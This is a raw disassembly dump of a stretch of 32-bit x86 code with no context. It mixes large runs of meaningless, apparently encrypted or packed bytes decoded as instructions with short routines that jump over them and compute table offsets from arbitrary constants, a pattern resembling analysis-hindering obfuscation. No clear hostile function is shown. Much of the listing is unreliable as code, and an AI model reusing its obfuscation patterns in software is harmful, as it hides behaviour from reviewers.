  410915:	clts   
  410917:	pushf  
  410918:	(bad)  
  410919:	shr    DWORD PTR [esi],0xa9
  41091c:	mov    esp,ebx
  41091e:	test   BYTE PTR [ebx],bl
  410920:	std    
  410921:	push   cs
  410922:	sub    eax,0xf8565200
  410927:	and    al,0x71
  410929:	inc    esi
  41092a:	xchg   ebp,eax
  41092b:	retf   
  41092c:	out    0x3d,al
  41092e:	inc    ebp
  41092f:	mov    ebp,0x805b42fe
  410934:	jnp    0x4108f9
  410936:	mov    edx,0xbb2585b3
  41093b:	sahf   
  41093c:	xlat   BYTE PTR ds:[ebx]
  41093d:	pop    eax
  41093e:	mov    esi,0xc02d6e0a
  410943:	das    
  410944:	dec    eax
  410945:	mov    al,0x5e
  410947:	arpl   cx,dx
  410949:	out    dx,al
  41094a:	and    BYTE PTR [ecx],ah
  41094c:	add    edi,ebp
  41094e:	or     DWORD PTR [ebp+0x4d021811],ebp
  410954:	inc    eax
  410955:	shr    DWORD PTR [edi-0x1d],cl
  410958:	cld    
  410959:	das    
  41095a:	sub    esp,DWORD PTR [ecx]
  41095c:	pop    esi
  41095d:	pop    ss
  41095e:	push   edx
  41095f:	or     edi,DWORD PTR [esi+0x71]
  410962:	dec    ebp
  410963:	pop    ecx
  410964:	call   0x47b9de82
  410969:	test   eax,0x2d1bb05d
  41096e:	dec    ecx
  41096f:	imul   ebx,DWORD PTR [ebx+0x3d9480da],0xde9a63e
  410979:	mov    ecx,DWORD PTR [ecx-0x3]
  41097c:	pop    ebx
  41097d:	fisub  WORD PTR [eax+0x7e69acd4]
  410983:	jmp    0x625cbed1
  410988:	xchg   ebp,eax
  410989:	(bad)  
  41098b:	in     al,0xad
  41098d:	mov    eax,0x745446f0
  410992:	rcl    DWORD PTR [ebx-0x48],cl
  410995:	dec    ebp
  410996:	push   es
  410997:	push   ebx
  410998:	ret    
  410999:	fnsave [ebx-0x5e795b3f]
  41099f:	push   es
  4109a0:	xacquire xchg DWORD PTR [edx-0x10],esp
  4109a4:	out    dx,al
  4109a5:	adc    al,0x56
  4109a7:	aaa    
  4109a8:	leave  
  4109a9:	repz mov edx,0xfd78b473
  4109af:	mov    ch,0x6f
  4109b1:	sete   BYTE PTR [ecx+0x7c]
  4109b5:	xchg   BYTE PTR [eax+0x606e36d9],al
  4109bb:	or     eax,0x58c4
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x42205c
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x42205c
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0x7e1f4ae3
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [esi-0x1e08c9ec],dl
  410a81:	jae    0x410abe
  410a83:	mov    BYTE PTR [edx+edi*8+0x2e],bh
  410a87:	mov    bl,0xbe
  410a89:	popa   
  410a8a:	adc    al,0x2f
  410a8c:	sbb    edx,DWORD PTR [esi]
  410a8e:	xchg   esi,eax
  410a8f:	add    BYTE PTR ds:0xc236fccf,dh
  410a95:	js     0x410a4b
  410a97:	push   esp
  410a98:	shl    BYTE PTR [ebp+0x18957e16],0xd1
  410a9f:	dec    ebx
  410aa0:	cmc    
  410aa1:	mov    bl,0x7e
  410aa3:	dec    ebx
  410aa4:	aad    0x66
  410aa6:	inc    ebp
  410aa7:	enter  0xfe96,0x66
  410aab:	pop    es
  410aac:	out    dx,al
  410aad:	int3   
  410aae:	and    eax,DWORD PTR [eax-0x510014f3]
  410ab4:	fstp   st(1)
  410ab6:	nop
  410ab7:	repnz push ebx
  410ab9:	xor    al,0xad
  410abb:	addr16 cld 
  410abd:	cmp    eax,0x6d4e4842
  410ac2:	jo     0x410a98
  410ac4:	add    DWORD PTR [edi-0x380786bc],0x47
  410acb:	dec    edi
  410acc:	imul   ecx,DWORD PTR [ecx+0x4],0x27
  410ad0:	mov    bl,BYTE PTR gs:[edx+0x566476a]
  410ad7:	xlat   BYTE PTR ds:[ebx]
  410ad8:	sbb    BYTE PTR [ecx],dl
  410ada:	push   ecx
  410adb:	shr    DWORD PTR [edi+ecx*2-0x3f43aaf7],1
  410ae2:	push   ss
  410ae3:	mov    ah,bh
  410ae5:	ds hlt 
  410ae7:	stos   DWORD PTR es:[edi],eax
  410ae8:	sbb    DWORD PTR [edi+0x69043269],eax
  410aee:	pop    ss
  410aef:	les    esi,FWORD PTR [ebp+0x55]
  410af2:	push   ebx
  410af3:	push   esp
  410af4:	(bad)
  410af8:	sbb    eax,0xa3c0258f
  410afd:	cdq    
  410afe:	retf   0x990f
  410b01:	sbb    edx,DWORD PTR [edi-0x1ba3d56e]
  410b07:	add    ch,BYTE PTR [ebp-0x3]
  410b0a:	loope  0x410aa4
  410b0c:	jl     0x410b39
  410b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b0f:	dec    esp
  410b10:	in     al,dx
  410b11:	add    DWORD PTR [edi+0x69efb6e9],ebp
  410b17:	call   0x61e:0x56a39c1c
  410b1e:	les    eax,FWORD PTR [edx]
  410b20:	div    BYTE PTR [eax+0x114b9d86]
  410b26:	ficomp DWORD PTR [ebx-0x44]
  410b29:	call   0x85a6:0x36aa2f7c
  410b30:	and    eax,DWORD PTR [edx-0x73]
  410b33:	lods   al,BYTE PTR ds:[esi]
  410b34:	mov    ebx,0x47aeda9b
  410b39:	cmp    al,0x92
  410b3b:	inc    eax
  410b3c:	jae    0x410ae0
  410b3e:	add    esp,DWORD PTR [eax]
  410b40:	pop    ebp
  410b42:	in     eax,0x2e
  410b44:	mov    ecx,0x13d0374b
  410b49:	das    
  410b4a:	daa    
  410b4b:	fidivr DWORD PTR [edx-0x74]
  410b4e:	shr    BYTE PTR [edi-0x5f88ca9c],0xc0
  410b55:	add    edx,DWORD PTR [edx-0x7f]
  410b58:	lock rol DWORD PTR [edi-0x7ef7917c],0x42
  410b60:	daa    
  410b61:	sub    BYTE PTR [ecx-0x30],0xc
  410b65:	inc    ebp
  410b66:	ins    BYTE PTR es:[edi],dx
  410b67:	jmp    0xe906:0x2bca2081
  410b6e:	adc    al,0x1c
  410b70:	jae    0x410b71
  410b72:	shr    DWORD PTR [ebx],1
  410b74:	hlt    
  410b75:	and    dh,dl
  410b77:	(bad)  
  410b78:	dec    ebx
  410b79:	in     al,0x96
  410b7b:	push   es
  410b7c:	aad    0x2a
  410b7e:	and    DWORD PTR [esi-0x64d6458f],0x31
  410b85:	pusha  
  410b86:	shl    BYTE PTR [eax+eiz*4-0x18],1
  410b8a:	xor    al,0xda
  410b8c:	push   edx
  410b8d:	ins    DWORD PTR es:[edi],dx
  410b8e:	scas   al,BYTE PTR es:[edi]
  410b8f:	pop    edx
  410b90:	fisttp QWORD PTR [esi+ebx*2]
  410b93:	fcomp  DWORD PTR [edx-0x18bc407d]
  410b99:	pusha  
  410b9a:	pop    edx
  410b9b:	int    0x37
  410b9d:	int    0xd1
  410b9f:	mov    cl,0xa0
  410ba1:	stos   DWORD PTR es:[edi],eax
  410ba2:	xchg   edi,eax
  410ba3:	sbb    BYTE PTR [ebp+0x7b],dh
  410ba6:	inc    esp
  410ba7:	adc    dh,BYTE PTR [edx+0x7bb6102c]
  410bad:	pop    ecx
  410bae:	inc    esi
  410baf:	mov    ds:0xa0dbcade,al
  410bb4:	push   ebx
  410bb5:	add    al,0xb7
  410bb7:	daa    
  410bb8:	xchg   ebx,eax
  410bb9:	mov    dh,0xfc
  410bbb:	push   ecx
  410bbc:	shl    BYTE PTR [ecx-0x316a8e9c],1
  410bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bc3:	lods   eax,DWORD PTR ds:[esi]
  410bc4:	aam    0x74
  410bc6:	repnz pop ss
  410bc8:	dec    ebx
  410bc9:	xor    al,0xd3
  410bcb:	jmp    0x53a9ba97
  410bd0:	stos   BYTE PTR es:[edi],al
  410bd1:	in     eax,0x9d
  410bd3:	push   edx
  410bd4:	ins    BYTE PTR es:[edi],dx
  410bd5:	mov    al,ds:0xccb15548
  410bda:	ins    DWORD PTR es:[edi],dx
  410bdb:	mov    ebp,0x825ef1fc
  410be0:	and    al,0xd
  410be2:	dec    esi
  410be3:	push   edi
  410be4:	es mov ah,0x95
  410be7:	sbb    DWORD PTR [eax],eax
  410be9:	fisub  WORD PTR [ebx]
  410beb:	mov    edi,0xb66e9e3f
  410bf0:	xor    esp,esp
  410bf2:	push   0xffffffb7
  410bf4:	repz mov ds:0x202452ef,eax
  410bfa:	inc    ebp
  410bfb:	call   0xd4fcf117
  410c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c01:	pop    es
  410c02:	push   ss
  410c03:	out    dx,al
  410c04:	cmp    DWORD PTR [ebx-0x3bb3bc85],0x4
  410c0b:	mov    DWORD PTR [edi-0x3],ebx
  410c0e:	xchg   DWORD PTR [edi-0x5c],ecx
  410c11:	xchg   DWORD PTR [edi-0x7b],ecx
  410c14:	jmp    0xa1a8:0x31964804
  410c1b:	shl    BYTE PTR [ebp+0xf84ca5d],1
  410c21:	outs   dx,BYTE PTR ds:[esi]
  410c22:	pop    ebp
  410c23:	div    DWORD PTR gs:[esp+ebp*4-0x54ec1505]
  410c2b:	dec    esi
  410c2c:	add    DWORD PTR [ecx],ecx
  410c2e:	inc    ebx
  410c2f:	aad    0x5
  410c31:	inc    ebp
  410c32:	pop    si
  410c34:	jp     0x9f860f20
  410c3a:	mov    BYTE PTR [edi],dl
  410c3c:	call   0x7be4:0xaea4002c
  410c43:	sub    bh,BYTE PTR [edx]
  410c45:	push   esp
  410c46:	lds    esi,FWORD PTR [ebp*8-0x10799395]
  410c4d:	mov    bh,0x49
  410c4f:	cmp    al,0x70
  410c51:	fadd   QWORD PTR [edx+0x7e]
  410c54:	or     eax,0x34c5d51e
  410c59:	dec    edi
  410c5a:	sub    DWORD PTR [eax+esi*8],0x9991b6c
  410c61:	ins    BYTE PTR es:[edi],dx
  410c62:	xor    eax,0x759a5410
  410c67:	jge    0x410bf9
  410c69:	not    DWORD PTR [ebp-0x27af29b4]
  410c6f:	and    bh,BYTE PTR [ebp+0x7a]
  410c72:	mov    esp,ecx
  410c74:	xchg   ebp,eax
  410c75:	jp     0x410c3f
  410c77:	aas    
  410c78:	mov    al,ds:0x78eabbda
  410c7d:	das    
  410c7e:	shr    esi,cl
  410c80:	jbe    0x410c9d
  410c82:	push   0xefd37e9a
  410c87:	and    DWORD PTR [ebp+0x1e3a6e35],0x37
  410c8e:	(bad)  
  410c8f:	jp     0x410c2c
  410c91:	sbb    BYTE PTR [esi+0x65],ch
  410c94:	xor    DWORD PTR [ecx+0x36],ebx
  410c97:	push   0x14
  410c99:	aas    
  410c9a:	sub    cl,dl
  410c9c:	and    eax,0x687d6992
  410ca1:	loopne 0x410d16
  410ca3:	xor    eax,0x79f211b4
  410ca8:	sti    
  410ca9:	sahf   
  410caa:	and    DWORD PTR [edx+0x64e3c61b],eax
  410cb0:	add    edx,esi
  410cb2:	jl     0x410cbd
  410cb4:	jg     0x410d11
  410cb6:	mov    edx,0x21c90317
  410cbb:	hlt    
  410cbc:	les    edi,FWORD PTR [edi]
  410cbe:	fbld   TBYTE PTR [edx+ecx*2-0x11b49a1d]
  410cc5:	xchg   ecx,eax
  410cc6:	inc    esi
  410cc7:	dec    esp
  410cc8:	fsub   st,st(4)
  410cca:	popf   
  410ccb:	push   0x5e
  410ccd:	lahf   
  410cce:	jmp    FWORD PTR [edi]
  410cd0:	push   cs
  410cd1:	dec    ecx
  410cd2:	daa    
  410cd3:	pop    eax
  410cd4:	sub    BYTE PTR [ecx+0x5b],ah
  410cd7:	stos   DWORD PTR es:[edi],eax
  410cd8:	inc    edi
  410cd9:	mov    eax,0x6a86fc20
  410cde:	sub    esi,edi
  410ce0:	adc    ebp,ecx
  410ce2:	add    bh,BYTE PTR [edi-0xa5a0985]
  410ce8:	push   edx
  410ce9:	jae    0x410d5c
  410ceb:	scas   eax,DWORD PTR es:[edi]
  410cec:	inc    edi
  410ced:	cwde   
  410cee:	sbb    al,0x3c
  410cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cf1:	mov    bh,0xf1
  410cf3:	cmp    ch,dl
  410cf5:	fnstsw WORD PTR [eax]
  410cf7:	adc    al,0xef
  410cf9:	pop    esi
  410cfa:	mov    edx,0x6470006e
  410cff:	aaa    
  410d00:	hlt    
  410d01:	(bad)  
  410d02:	popa   
  410d03:	pop    eax
  410d04:	clc    
  410d05:	int    0x22
  410d07:	add    eax,0xefbf5a52
  410d0c:	(bad)  
  410d0d:	mov    cl,0x42
  410d0f:	sub    DWORD PTR ds:0xdcd304f8,edi
  410d15:	sub    dl,BYTE PTR [ebp-0x7d]
  410d18:	push   0xffffffee
  410d1a:	retf   0xd505
  410d1d:	cmp    BYTE PTR [ebp+0x29577798],cl
  410d23:	sahf   
  410d24:	dec    ebp
  410d25:	sub    eax,0xa1e9b8ee
  410d2a:	jp     0x410d86
  410d2c:	dec    esp
  410d2d:	pop    ss
  410d2e:	mov    eax,0xcf10b6b1
  410d33:	add    ebx,DWORD PTR [ebx-0x2b03ed69]
  410d39:	fnstsw WORD PTR [eax+0xd]
  410d3c:	push   ebp
  410d3d:	pop    esp
  410d3e:	inc    eax
  410d3f:	mov    DWORD PTR [ebp-0x4],edi
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffffcf
  410d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d66:	test   eax,0x18826dbc
  410d6b:	sbb    BYTE PTR [edx-0x56e7e7ec],bl
  410d71:	sub    eax,0x2082e150
  410d76:	arpl   WORD PTR [eax],di
  410d78:	lods   eax,DWORD PTR ds:[esi]
  410d79:	mov    ah,0x64
  410d7b:	mov    ah,0x71
  410d7d:	inc    esp
  410d7e:	push   ebp
  410d7f:	and    eax,DWORD PTR [edx]
  410d81:	leave  
  410d82:	add    ch,ah
  410d84:	and    eax,0x22d1665b
  410d89:	pop    esi
  410d8a:	push   esi
  410d8b:	ins    DWORD PTR es:[edi],dx
  410d8c:	or     edi,DWORD PTR [edi]
  410d8e:	mov    eax,0x903bc377
  410d93:	or     al,0x2d
  410d95:	pxor   mm5,mm4
  410d98:	(bad)  
  410d99:	enter  0x3958,0x8d
  410d9d:	stos   DWORD PTR es:[edi],eax
  410d9e:	cmc    
  410d9f:	out    dx,al
  410da0:	sbb    edi,DWORD PTR [ebp+0x76f2396f]
  410da6:	(bad)  
  410da7:	lock jb 0x410e24
  410daa:	outs   dx,DWORD PTR ds:[esi]
  410dab:	push   0xffffff87
  410dad:	or     DWORD PTR [edi],0xffffffd1
  410db0:	mov    al,0xeb
  410db2:	int    0x56
  410db4:	in     al,0x60
  410db6:	pop    edx
  410db7:	push   edx
  410db8:	mov    bl,0xb
  410dba:	dec    edx
  410dbb:	fisubr WORD PTR [ebp-0x1ffa360]
  410dc1:	push   esi
  410dc2:	test   DWORD PTR [edi-0x3e],0xbc817282
  410dc9:	push   0x4b5113e4
  410dce:	ja     0x410e3f
  410dd0:	mov    bl,0xc6
  410dd2:	leave  
  410dd3:	je     0x410d5b
  410dd5:	repz ror cl,cl
  410dd8:	clc    
  410dd9:	outs   dx,DWORD PTR ds:[esi]
  410dda:	pusha  
  410ddb:	pop    esp
  410ddc:	mov    BYTE PTR [eax+0xd0fb7af],bl
  410de2:	jb     0x410d71
  410de4:	jge    0x410dd5
  410de6:	loope  0x410e48
  410de8:	push   cs
  410de9:	icebp  
  410dea:	jb     0x410da3
  410dec:	mov    WORD PTR [esi*4-0x1b7e6756],cs
  410df3:	lahf   
  410df4:	cmp    ch,BYTE PTR [ecx-0x48]
  410df7:	push   cs
  410df8:	lock lock iret 
  410dfb:	dec    esp
  410dfc:	mov    ch,0x8
  410dfe:	push   es
  410dff:	push   eax
  410e00:	mov    eax,ds:0xfc087fec
  410e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e06:	dec    ebx
  410e07:	je     0x410df5
  410e09:	dec    edx
  410e0a:	push   ebx
  410e0b:	fs cmp eax,0x45cf050e
  410e11:	inc    edi
  410e12:	mov    bl,0x76
  410e14:	push   0xffffffab
  410e16:	cs dec ebp
  410e18:	add    ecx,edx
  410e1a:	loop   0x410e36
  410e1c:	loopne 0x410daa
  410e1e:	ror    DWORD PTR [ebx-0x15e124eb],1
  410e24:	arpl   WORD PTR [ebx],cx
  410e26:	add    DWORD PTR [esi-0x6ca56f24],ebp
  410e2c:	lds    esi,FWORD PTR [edi-0x20]
  410e2f:	retf   
  410e30:	aam    0x7a
  410e32:	push   0x35
  410e34:	shl    BYTE PTR [esi],1
  410e36:	dec    eax
  410e37:	mov    eax,0x7a7c651b
  410e3c:	mov    DWORD PTR [ebp+ebp*2+0x3f],esi
  410e40:	daa    
  410e41:	or     BYTE PTR [ebp-0x538d10ff],ah
  410e47:	(bad)  
  410e48:	addr16 push edx
  410e4a:	mov    ecx,0x1ea1b8aa
  410e4f:	sbb    DWORD PTR [ebx+esi*1+0x2952c44f],edi
  410e56:	mov    ah,0xc7
  410e58:	addr16 jb 0x410e8d
  410e5b:	sub    edi,DWORD PTR [edx+0x62]
  410e5e:	xor    al,0xa6
  410e60:	xchg   esp,eax
  410e61:	sub    edx,DWORD PTR [eax+0x3d076851]
  410e67:	push   ss
  410e68:	test   DWORD PTR [ebp-0x34],0x4fa1934f
  410e6f:	sahf   
  410e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e71:	inc    edi
  410e72:	test   al,0x0
  410e74:	outs   dx,BYTE PTR ds:[esi]
  410e75:	push   es
  410e76:	adc    al,0x5
  410e78:	add    ch,bh
  410e7a:	sbb    dl,dh
  410e7c:	inc    ebp
  410e7d:	pop    edi
  410e7e:	out    dx,eax
  410e7f:	stc    
  410e80:	pop    ss
  410e81:	add    DWORD PTR [ebx+0x66e26684],ecx
  410e87:	loope  0x410e75
  410e89:	xor    eax,0xf0857ea1
  410e8e:	add    esi,DWORD PTR [edi-0x1ebd440b]
  410e94:	mov    esi,0x14394e1b
  410e99:	mov    ebp,0xcc68fdcc
  410e9e:	mov    ebp,0xaeffe6ef
  410ea3:	inc    esp
  410ea4:	call   0xc3d68113
  410ea9:	inc    edi
  410eaa:	jae    0x410f02
  410eac:	or     WORD PTR [esi+eiz*1+0x4d69972a],bp
  410eb4:	mov    ds:0x5e256da1,al
  410eb9:	mov    ds:0xd6177593,al
  410ebe:	push   ecx
  410ebf:	cli    
  410ec0:	sub    DWORD PTR [esi-0x5b70191e],0xf1f18a44
  410eca:	push   ss
  410ecb:	mov    edi,0x541678f4
  410ed0:	jle    0x410f2a
  410ed2:	cmp    eax,0xd863a748
  410ed7:	mov    esp,0x548ffad6
  410edc:	pushf  
  410edd:	ja     0x410f5e
  410edf:	(bad)  
  410ee0:	outs   dx,DWORD PTR ds:[esi]
  410ee1:	xor    al,0x6f
  410ee3:	retf   
  410ee4:	in     al,dx
  410ee5:	inc    ecx
  410ee6:	jle    0x410ec3
  410ee8:	call   0x75551ae2
  410eed:	test   edx,edx
  410eef:	or     eax,0xb92c1734
  410ef4:	mov    ebx,DWORD PTR [edx-0x60]
  410ef7:	scas   al,BYTE PTR es:[edi]
  410ef8:	into   
  410ef9:	xchg   BYTE PTR [esi],ah
  410efb:	bound  ebx,QWORD PTR [ebx]
  410efd:	add    al,0x19
  410eff:	scas   al,BYTE PTR es:[edi]
  410f00:	push   0x980b276e
  410f05:	mov    ecx,0x23aaeb71
  410f0a:	sahf   
  410f0b:	jno    0x410f80
  410f0d:	ds jns 0x410ea2
  410f10:	inc    esi
  410f11:	pop    ds
  410f12:	mov    DWORD PTR [ebp+0x326e8eed],edi
  410f18:	scas   al,BYTE PTR es:[edi]
  410f19:	pop    eax
  410f1a:	pop    edi
  410f1b:	push   edi
  410f1c:	mov    edi,0xedfbb25
  410f21:	fsubp  st(3),st
  410f23:	aaa    
  410f24:	lock outs dx,BYTE PTR ds:[esi]
  410f26:	test   eax,0xd25a62de
  410f2b:	cmp    DWORD PTR [edx+0x67c080b5],ebx
  410f31:	mov    eax,esi
  410f33:	(bad)  
  410f34:	lock gs cdq 
  410f37:	sbb    esi,ecx
  410f39:	in     al,0x61
  410f3b:	(bad)  
  410f3d:	(bad)  
  410f3f:	repz daa 
  410f41:	jecxz  0x410ec8
  410f43:	in     al,0xe4
  410f45:	or     BYTE PTR [ebx],ch
  410f47:	loop   0x410f34
  410f49:	mov    ah,0x20
  410f4b:	mov    ah,0xfe
  410f4d:	aas    
  410f4e:	fdivr  st,st(3)
  410f50:	cmp    DWORD PTR [esi-0x3971c2ca],esp
  410f56:	or     al,0x25
  410f58:	cwde   
  410f59:	push   ecx
  410f5a:	sub    edx,DWORD PTR [eax-0xbd1c30d]
  410f60:	or     al,0x1f
  410f62:	sub    al,0xe4
  410f64:	pop    eax
  410f65:	add    bh,BYTE PTR [edi]
  410f67:	call   0xd037:0xbd50b585
  410f6e:	xchg   edi,eax
  410f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f70:	or     esp,esp
  410f72:	adc    bh,BYTE PTR [ecx+0x79]
  410f75:	mov    DWORD PTR [ebx-0x65],ebx
  410f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f79:	jge    0x410f8b
  410f7b:	mov    ds:0x9f900dd4,eax
  410f80:	mov    DWORD PTR fs:[ecx-0x60267c11],esi
  410f87:	out    0x84,al
  410f89:	fidivr WORD PTR [ebx+0x19c513dc]
  410f8f:	dec    ebx
  410f90:	(bad)  
  410f91:	dec    esp
  410f92:	in     al,dx
  410f93:	inc    esi
  410f94:	sub    edi,0xa8bb82d
  410f9a:	sub    eax,0x7115b423
  410f9f:	pushf  
  410fa0:	data16 (bad) 
  410fa2:	sbb    al,0xde
  410fa4:	sub    al,0x28
  410fa6:	push   0xffffffb6
  410fa8:	in     al,dx
  410fa9:	aam    0x7f
  410fab:	imul   BYTE PTR [eax-0x7e]
  410fae:	jnp    0x410ffd
  410fb0:	jnp    0x410fa0
  410fb2:	adc    BYTE PTR [esi-0x35381373],al
  410fb8:	lds    ecx,FWORD PTR [edx]
  410fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fbb:	sub    eax,0xb4ad12c
  410fc0:	and    DWORD PTR [edx-0x19],edi
  410fc3:	push   0xffffff90
  410fc5:	cwde   
  410fc6:	loope  0x411000
  410fc8:	and    eax,0x68576e35
  410fcd:	xor    dl,bh
  410fcf:	push   ebp
  410fd0:	(bad)  
  410fd1:	sbb    eax,0xf324f9f8
  410fd6:	loope  0x410fa1
  410fd8:	xchg   edi,eax
  410fd9:	test   cl,0xc7
  410fdc:	add    esp,DWORD PTR [edi]
  410fde:	jmp    0xfe1f:0x410583df
  410fe5:	mov    WORD PTR [ebx-0x22772a64],cs
  410feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fec:	xor    eax,0xd706dea3
  410ff1:	ror    DWORD PTR [eax+0x559aec39],cl
  410ff7:	inc    edi
  410ff8:	inc    esi
  410ff9:	mov    DWORD PTR [ecx-0x4ed8fc97],ecx
  410fff:	aaa    
  411000:	imul   esp,esi,0x402810b8
  411006:	test   edi,0x75228f41
  41100c:	xchg   ebp,eax
  41100d:	mov    ebx,0x8a563e8a
  411012:	xlat   BYTE PTR ds:[ebx]
  411013:	(bad)  
  411014:	call   0x65cf0625
  411019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41101a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41101b:	add    DWORD PTR [ecx+0x2b4813f8],0xcf1747bf
  411025:	imul   ebx,DWORD PTR [ecx+0x50e584b5],0x31cd41f
  41102f:	lahf   
  411030:	stc    
  411031:	lods   eax,DWORD PTR ds:[esi]
  411032:	pushf  
  411033:	mov    ecx,DWORD PTR [ebp-0x4]
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
